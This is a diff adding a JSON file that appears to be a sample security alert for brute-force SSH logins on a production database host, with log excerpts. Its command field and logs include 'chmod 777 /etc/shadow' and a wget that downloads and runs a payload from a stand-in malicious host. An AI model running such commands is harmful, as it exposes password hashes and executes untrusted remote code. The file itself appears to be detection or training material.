@@ -1,0 +1,12 @@
+{
+    "alert_name": "Multiple Failed Login Attempts Followed by Successful Login",
+    "timestamp": "2023-11-15T14:23:45Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "10.0.0.5",
+    "hostname": "srv-db-prod01",
+    "user": "admin",
+    "command": "chmod 777 /etc/shadow; wget http://malicious.example/payload; ./payload &",
+    "severity": "High",
+    "description": "Multiple failed login attempts (15) followed by a successful login with credential reuse pattern. After login, suspicious commands were executed with privileged access.",
+    "logs": "Nov 15 14:20:12 srv-db-prod01 sshd[12345]: Failed password for admin from 192.168.1.100 port 57321 ssh2\nNov 15 14:20:42 srv-db-prod01 sshd[12346]: Failed password for admin from 192.168.1.100 port 57322 ssh2\n[...13 more failed attempts...]\nNov 15 14:23:45 srv-db-prod01 sshd[12360]: Accepted password for admin from 192.168.1.100 port 57335 ssh2\nNov 15 14:24:01 srv-db-prod01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\nNov 15 14:24:12 srv-db-prod01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow\nNov 15 14:24:23 srv-db-prod01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example/payload"
+  }
